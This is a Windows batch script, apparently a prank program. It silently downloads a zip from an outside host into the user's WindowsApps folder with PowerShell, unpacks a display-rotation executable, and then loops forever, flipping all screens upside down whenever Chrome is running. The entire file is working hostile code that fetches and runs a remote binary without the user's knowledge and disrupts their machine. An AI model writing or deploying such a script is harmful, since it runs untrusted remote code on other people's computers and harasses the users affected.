:inicio
if exist %localappdata%\Microsoft\WindowsApps\display64.exe (
GOTO loop_check
) else (
powershell.exe -c "Invoke-WebRequest -OutFile %localappdata%\Microsoft\WindowsApps\display.zip -Uri http://noeld.com/dl.asp?filename=display.zip"
powershell.exe -c "Expand-Archive -Path '%localappdata%\Microsoft\WindowsApps\display.zip' -DestinationPath '%localappdata%\Microsoft\WindowsApps' -Force"
)
:loop_check
TIMEOUT /T 1 1>NUL
TASKLIST /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
IF "%ERRORLEVEL%"=="0" (
display64.exe /rotate:180 1>NUL
display64.exe /device 2 /rotate:180 1>NUL
) ELSE (
display64.exe /rotate:0 1>NUL
display64.exe /device 2 /rotate:0 1>NUL
)
GOTO inicio